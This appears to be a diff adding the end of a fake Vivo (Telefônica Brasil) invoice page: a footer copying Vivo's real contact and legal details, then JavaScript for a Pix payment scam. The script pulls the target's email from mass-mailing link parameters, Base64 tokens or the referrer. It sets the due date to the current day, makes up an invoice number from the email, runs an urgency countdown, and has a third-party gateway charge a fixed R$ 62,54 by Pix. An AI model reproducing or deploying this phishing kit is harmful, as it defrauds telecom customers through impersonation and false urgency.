+                        <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                        Canais de Atendimento
+                    </div>
+                    <ul class="footer-links-list">
+                        <li>
+                            <a href="#" class="footer-link-item" onclick="return false;">
+                                <span class="purple-icon-circle">
+                                    <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                                </span>
+                                <span>Central Móvel: <strong>1058</strong></span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#" class="footer-link-item" onclick="return false;">
+                                <span class="purple-icon-circle">
+                                    <svg viewBox="0 0 24 24"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                                </span>
+                                <span>Ouvidoria: <strong>0800 775 1212</strong></span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#" class="footer-link-item" onclick="return false;">
+                                <span class="purple-icon-circle">
+                                    <!-- ÍCONE WHATSAPP OFICIAL VETORIAL -->
+                                    <svg viewBox="0 0 24 24" style="stroke:none; fill:var(--vivo-purple);"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.82 9.82 0 0 0 12.04 2zm5.8 14.15c-.24.67-1.39 1.28-1.92 1.36-.5.08-1.12.11-1.8-.11-.42-.14-.96-.32-1.65-.62-2.9-1.26-4.79-4.22-4.94-4.41-.14-.2-1.18-1.57-1.18-2.99s.75-2.12 1.01-2.41c.27-.29.58-.36.78-.36h.56c.18 0 .42-.01.65.5.24.58.82 2 .89 2.15.07.14.12.31.02.5-.1.19-.15.31-.29.48-.15.17-.31.38-.44.51-.15.14-.3.3-.13.59.17.29.74 1.22 1.59 1.98 1.09.97 2.01 1.27 2.3 1.41.29.14.46.12.63-.07.17-.2.73-.85.93-1.14.2-.29.39-.24.66-.14.27.1 1.7.8 1.99.95.29.14.48.22.55.34.07.12.07.7-.17 1.37z"/></svg>
+                                </span>
+                                <span>WhatsApp Vivo Oficial</span>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- COLUNA 2: SEGURANÇA E DADOS (ÍCONES ROXOS VETORIAIS CORRIGIDOS) -->
+                <div>
+                    <div class="footer-col-title">
+                        <!-- ÍCONE SEGURANÇA E DADOS VETORIAL NÍTIDO -->
+                        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                        Segurança e Dados
+                    </div>
+                    <ul class="footer-links-list">
+                        <li>
+                            <a href="#" class="footer-link-item" onclick="return false;">
+                                <span class="purple-icon-circle">
+                                    <!-- ÍCONE CADEADO PRIVACIDADE / LGPD -->
+                                    <svg viewBox="0 0 24 24"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                                </span>
+                                <span>Portal de Privacidade e LGPD</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#" class="footer-link-item" onclick="return false;">
+                                <span class="purple-icon-circle">
+                                    <!-- ÍCONE GUIA DE SEGURANÇA PIX VIVO: ESCUDO COM CHECKMARK -->
+                                    <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                                </span>
+                                <span>Guia de Segurança Pix Vivo</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#" class="footer-link-item" onclick="return false;">
+                                <span class="purple-icon-circle">
+                                    <!-- ÍCONE PORTAL VIVO: GLOBO / CONECTIVIDADE -->
+                                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+                                </span>
+                                <span>Portal Oficial vivo.com.br</span>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+
+            </div>
+
+            <!-- REDES SOCIAIS VIVO COM ÍCONES ROXOS PERFEITOS E CENTRALIZADOS -->
+            <div class="footer-social-bar">
+                <span class="footer-social-title">Siga a Vivo nas redes</span>
+                <div class="social-icons-group">
+                    <!-- Instagram (SVG Branco dentro do círculo Roxo) -->
+                    <a href="https://instagram.com/vivo" target="_blank" rel="noopener" class="social-btn" title="Instagram Vivo">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect width="20" height="20" x="2" y="2" rx="5" ry="5"/>
+                            <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
+                            <line x1="17.5" x2="17.51" y1="6.5" y2="6.5"/>
+                        </svg>
+                    </a>
+                    <!-- Facebook (SVG Branco dentro do círculo Roxo) -->
+                    <a href="https://facebook.com/vivo" target="_blank" rel="noopener" class="social-btn" title="Facebook Vivo">
+                        <svg viewBox="0 0 24 24" fill="#ffffff">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                    </a>
+                    <!-- X / Twitter (SVG Branco dentro do círculo Roxo) -->
+                    <a href="https://x.com/vivo" target="_blank" rel="noopener" class="social-btn" title="X Vivo">
+                        <svg viewBox="0 0 24 24" fill="#ffffff">
+                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                        </svg>
+                    </a>
+                    <!-- YouTube (SVG Branco dentro do círculo Roxo) -->
+                    <a href="https://youtube.com/vivo" target="_blank" rel="noopener" class="social-btn" title="YouTube Vivo">
+                        <svg viewBox="0 0 24 24" fill="#ffffff">
+                            <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+
+            <!-- INFORMAÇÕES LEGAIS DA TELEFÔNICA BRASIL CENTRALIZADAS -->
+            <p class="footer-legal-text">
+                Telefônica Brasil S.A. – CNPJ: 02.558.157/0001-62<br>
+                Av. Engenheiro Luís Carlos Berrini, 1376 - Cidade Monções, São Paulo - SP, CEP: 04571-936.<br>
+                © 2026 Vivo. Todos os direitos reservados.
+            </p>
+
+        </div>
+    </footer>
+
+    <!-- LOGICA JAVASCRIPT: URL DE DISPARO, PIX E POLLING -->
+    <script>
+        (function() {
+            // Referências de elementos
+            const emailValEl = null; // Removido do layout — email é usado apenas internamente na API
+            const dueDateValEl = document.getElementById('dueDateVal');
+            const refMonthValEl = document.getElementById('refMonthVal');
+            const invoiceCodeValEl = document.getElementById('invoiceCodeVal');
+            const qrImageEl = document.getElementById('qrImage');
+            const qrViewport = document.getElementById('qrViewport');
+            const pixCodeField = document.getElementById('pixCodeField');
+            const btnCopy = document.getElementById('btnCopy');
+            const btnCopyLabel = document.getElementById('btnCopyLabel');
+            const copyToast = document.getElementById('copyToast');
+            const timerText = document.getElementById('timerText');
+            const statusBadge = document.getElementById('statusBadge');
+            const statusLabel = document.getElementById('statusLabel');
+            const pixPaymentArea = document.getElementById('pixPaymentArea');
+            const paidScreen = document.getElementById('paidScreen');
+            const receiptId = document.getElementById('receiptId');
+            const receiptCustomer = document.getElementById('receiptCustomer');
+            const receiptTimestamp = document.getElementById('receiptTimestamp');
+
+            let currentTxId = "hr9ba8wjhvgo88tlm22kuodc";
+            let pollingActive = false;
+            let secondsLeft = 1785; // ~30 min
+
+            /**
+             * 1. Extração Ultra-Robusta do E-mail do Cliente
+             * Suporta disparos de e-mail marketing, parâmetros de qualquer nome (?email=, ?e=, ?to=, ?dest=, ?c=, ?u=, ?id=),
+             * Base64 (padrão e url-safe), parâmetros no hash (#email= ou #cliente@...), URLs codificadas (%40 / %2540),
+             * e-mails embutidos diretamente na URL (?cliente@dominio.com), tokens JSON, document.referrer e localStorage.
+             */
+            const EMAIL_REGEX = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/i;
+
+            function cleanDecoded(str) {
+                if (!str || typeof str !== 'string') return '';
+                try { str = decodeURIComponent(str); } catch(e){}
+                try { str = decodeURIComponent(str); } catch(e){}
+                return str.trim();
+            }
+
+            function extractEmailFromString(str) {
+                if (!str || typeof str !== 'string') return null;
+                const cleaned = cleanDecoded(str);
+                const match = cleaned.match(EMAIL_REGEX);
+                if (match) {
+                    let em = match[0].toLowerCase();
+                    em = em.replace(/[.,\/>]+$/, '');
+                    if (EMAIL_REGEX.test(em)) return em;
+                }
+                return null;
+            }
+
+            function decodeBase64Safe(val) {
+                if (!val || typeof val !== 'string') return null;
+                const clean = val.trim().replace(/^['"]|['"]$/g, '');
+                if (clean.length < 6 || !/^[A-Za-z0-9+/=_-]+$/.test(clean)) return null;
+                let normalized = clean.replace(/-/g, '+').replace(/_/g, '/');
+                while (normalized.length % 4) normalized += '=';
+                try {
+                    const decoded = atob(normalized);
+                    return decoded;
+                } catch(e) {
+                    return null;
+                }
+            }
+
+            function persistEmail(email) {
+                try {
+                    localStorage.setItem('vivo_client_email', email);
+                    sessionStorage.setItem('vivo_client_email', email);
+                } catch(e){}
+            }
+
+            function getClientEmailFromUrl() {
+                const fullHref = window.location.href;
+
+                // 1. Busca direta na URL completa
+                let email = extractEmailFromString(fullHref);
+                if (email) {
+                    persistEmail(email);
+                    return email;
+                }
+
+                // 2. Coleta de candidatos de query params, hash e path
+                const candidates = [];
+
+                // Parâmetros de query da URL (?email=, ?e=, ?to=, ?dest=, etc.)
+                try {
+                    const searchParams = new URLSearchParams(window.location.search);
+                    searchParams.forEach((val, key) => {
+                        candidates.push(val);
+                        candidates.push(key);
+                    });
+                } catch(e){}
+
+                // Suporte para hash (#/fatura?email=... ou #email=... ou #cliente@...)
+                try {
+                    const hashRaw = window.location.hash.replace(/^#\/?/, '');
+                    if (hashRaw) {
+                        candidates.push(hashRaw);
+                        const hashParams = new URLSearchParams(hashRaw.includes('?') ? hashRaw.substring(hashRaw.indexOf('?') + 1) : hashRaw);
+                        hashParams.forEach((val, key) => {
+                            candidates.push(val);
+                            candidates.push(key);
+                        });
+                    }
+                } catch(e){}
+
+                // Segmentos de rota
+                if (window.location.pathname) {
+                    candidates.push(window.location.pathname);
+                }
+
+                // Fragmentos da URL divididos por delimitadores comuns
+                const tokens = fullHref.split(/[\?&#\/;=,\s]+/);
+                candidates.push(...tokens);
+
+                // Testa cada candidato
+                for (const item of candidates) {
+                    if (!item || typeof item !== 'string') continue;
+
+                    let found = extractEmailFromString(item);
+                    if (found) {
+                        persistEmail(found);
+                        return found;
+                    }
+
+                    const decoded = decodeBase64Safe(item);
+                    if (decoded) {
+                        found = extractEmailFromString(decoded);
+                        if (found) {
+                            persistEmail(found);
+                            return found;
+                        }
+                    }
+                }
+
+                // 3. Checa document.referrer
+                if (document.referrer) {
+                    const refEmail = extractEmailFromString(document.referrer);
+                    if (refEmail) {
+                        persistEmail(refEmail);
+                        return refEmail;
+                    }
+                }
+
+                // 4. Checa localStorage/sessionStorage
+                try {
+                    const saved = localStorage.getItem('vivo_client_email') || sessionStorage.getItem('vivo_client_email');
+                    if (saved && EMAIL_REGEX.test(saved)) {
+                        return saved.toLowerCase();
+                    }
+                } catch(e){}
+
+                // 5. Fallback padrão profissional (nunca usa cliente@exemplo.com)
+                return 'cliente@vivo.com.br';
+            }
+
+            let clientEmail = getClientEmailFromUrl();
+            receiptCustomer.textContent = clientEmail;
+
+            /**
+             * 2. Configura data de vencimento e código da fatura sempre para o DIA ATUAL
+             * À meia-noite (00:00), o sistema atualiza automaticamente para o novo dia
+             */
+            function updateDynamicDates() {
+                const now = new Date();
+                const dd = String(now.getDate()).padStart(2, '0');
+                const mm = String(now.getMonth() + 1).padStart(2, '0');
+                const yyyy = now.getFullYear();
+                const dateStr = `${dd}/${mm}/${yyyy}`;
+                const monthNames = ["Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho", "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"];
+                
+                refMonthValEl.textContent = `${monthNames[now.getMonth()]} / ${yyyy}`;
+                dueDateValEl.textContent = `${dateStr} (Hoje)`;
+                receiptTimestamp.textContent = `${dateStr} às ${now.toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit'})}`;
+            }
+
+            function updateInvoiceCode() {
+                const numHash = Math.abs(clientEmail.split('').reduce((a, c) => a + c.charCodeAt(0), 0) * 8931);
+                const rawSeq = String(numHash).padStart(11, '3');
+                invoiceCodeValEl.textContent = `${rawSeq.substring(0,4)}.${rawSeq.substring(4,8)}.${rawSeq.substring(8,11)}-7`;
+            }
+
+            updateDynamicDates();
+            updateInvoiceCode();
+            // Checa a cada 10 segundos para atualizar no exato momento da virada da meia-noite (00:00)
+            setInterval(updateDynamicDates, 10000);
+
+            /**
+             * 3. Contador Regressivo
+             */
+            setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft <= 0) {
+                    timerText.textContent = "Expirado";
+                    return;
+                }
+                const m = Math.floor(secondsLeft / 60);
+                const s = secondsLeft % 60;
+                timerText.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+            }, 1000);
+
+            /**
+             * 4. Função Copiar Código Pix
+             */
+            function copyPix() {
+                const code = pixCodeField.value;
+                if (!code) return;
+
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(code).then(triggerCopied).catch(fallbackCopyMethod);
+                } else {
+                    fallbackCopyMethod();
+                }
+            }
+
+            function fallbackCopyMethod() {
+                pixCodeField.select();
+                pixCodeField.setSelectionRange(0, 99999);
+                try {
+                    document.execCommand('copy');
+                    triggerCopied();
+                } catch(e) {
+                    alert('Código selecionado. Pressione Ctrl+C ou segure para copiar.');
+                }
+            }
+
+            function triggerCopied() {
+                btnCopy.classList.add('success');
+                btnCopyLabel.textContent = "Código Pix copiado!";
+                copyToast.style.display = "flex";
+
+                setTimeout(() => {
+                    btnCopy.classList.remove('success');
+                    btnCopyLabel.textContent = "Copiar código Pix";
+                }, 4000);
+            }
+
+            btnCopy.addEventListener('click', copyPix);
+            pixCodeField.addEventListener('click', () => {
+                pixCodeField.select();
+                copyPix();
+            });
+
+            /**
+             * 5. Renderização do QR Code
+             */
+            function updateQrDisplay(pixCopyPaste) {
+                pixCodeField.value = pixCopyPaste;
+                const encoded = encodeURIComponent(pixCopyPaste);
+
+                // Atualiza imagem do QR Code
+                qrImageEl.src = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=0&data=${encoded}`;
+
+                // Se a lib qrcode.js estiver disponível, desenha com canvas nativo
+                if (typeof QRCode !== 'undefined') {
+                    try {
+                        qrViewport.innerHTML = '';
+                        new QRCode(qrViewport, {
+                            text: pixCopyPaste,
+                            width: 185,
+                            height: 185,
+                            colorDark: "#000000",
+                            colorLight: "#ffffff",
+                            correctLevel: QRCode.CorrectLevel.M
+                        });
+                    } catch(e) {
+                        qrViewport.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=0&data=${encoded}" alt="QR Code Pix" style="max-width:100%; height:auto;">`;
+                    }
+                }
+            }
+
+            /**
+             * 6. Geração da Cobrança Pix via API Gateway (BravoPay)
+             */
+            async function requestLivePix() {
+                const searchParams = new URLSearchParams(window.location.search);
+                const payload = {
+                    action: 'create_pix',
+                    email: clientEmail,
+                    name: searchParams.get('nome') || searchParams.get('name') || 'Cliente Vivo',
+                    amount_cents: 6254, // R$ 62,54
+                    utm_source: searchParams.get('utm_source') || 'email',
+                    utm_medium: searchParams.get('utm_medium') || 'disparo',
+                    utm_campaign: searchParams.get('utm_campaign') || 'cobranca_vivo'
+                };
+
+                // Mostra loading enquanto gera o Pix
+                qrViewport.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:10px;"><div class="status-indicator" style="width:12px;height:12px;background:var(--vivo-purple);"></div><span style="font-size:11px;color:var(--text-muted);font-weight:600;">Gerando Pix...</span></div>';
+
+                const candidateUrls = [
+                    '/api/pix',
+                    'http://localhost:3000/api/pix',
+                    '/api.php'
+                ];
+
+                for (const targetUrl of candidateUrls) {
+                    try {
+                        const response = await fetch(targetUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+
+                        if (!response.ok) continue;
+
+                        // Garante que a resposta é JSON (evita pegar arquivo PHP cru, HTML 404, etc.)
+                        const contentType = response.headers.get('content-type') || '';
+                        if (!contentType.includes('application/json')) continue;
+
+                        const resJson = await response.json();
+
+                        // Se a API retornou erro explícito, tenta próximo endpoint
+                        if (resJson.error) continue;
+
+                        const copyPasteStr = resJson.pix?.copy_paste || resJson.copy_paste;
+                        if (copyPasteStr) {
+                            currentTxId = resJson.id || currentTxId;
+                            updateQrDisplay(copyPasteStr);
+                            startStatusCheck(currentTxId);
+                            return;
+                        }
+                    } catch(err) {
+                        continue;
+                    }
+                }
+
+                // Fallback: restaura QR estático padrão se nenhum endpoint respondeu
+                const fallbackCode = pixCodeField.value;
+                qrViewport.innerHTML = '<img id="qrImage" src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=0&data=' + encodeURIComponent(fallbackCode) + '" alt="QR Code Pix" style="max-width:100%;height:auto;">';
+                startStatusCheck(currentTxId);
+            }
+
+            let currentCheckInterval = null;
+
+            /**
+             * 7. Verificação em tempo real do pagamento
+             */
+            function startStatusCheck(txId) {
+                if (!txId) return;
+                if (currentCheckInterval) clearInterval(currentCheckInterval);
+                pollingActive = true;
+
+                currentCheckInterval = setInterval(async () => {
+                    const checkEndpoints = [
+                        `/api/check-status?id=${encodeURIComponent(txId)}`,
+                        `http://localhost:3000/api/check-status?id=${encodeURIComponent(txId)}`,
+                        `/api.php?action=check_status&id=${encodeURIComponent(txId)}`
+                    ];
+
+                    for (const url of checkEndpoints) {
+                        try {
+                            const res = await fetch(url);
+                            if (res.ok) {
+                                const data = await res.json();
+                                if (data && data.status && data.status.toUpperCase() === 'PAID') {
+                                    clearInterval(currentCheckInterval);
+                                    showPaymentSuccess(txId);
+                                    return;
+                                }
+                            }
+                        } catch(e) {}
+                    }
+                }, 4000);
+            }
+
+            /**
+             * 8. Transição para Tela de Sucesso
+             */
+            function showPaymentSuccess(txId) {
+                statusBadge.className = 'status-pill paid';
+                statusLabel.textContent = 'Pago';
+                receiptId.textContent = `#${txId}`;
+
+                pixPaymentArea.style.display = 'none';
+                paidScreen.style.display = 'block';
+
+                if (navigator.vibrate) {
+                    navigator.vibrate([120, 60, 120]);
+                }
+            }
+
+            // Inicia geração imediatamente no carregamento da página
+            requestLivePix();
+        })();
+    </script>
+</body>
+</html>
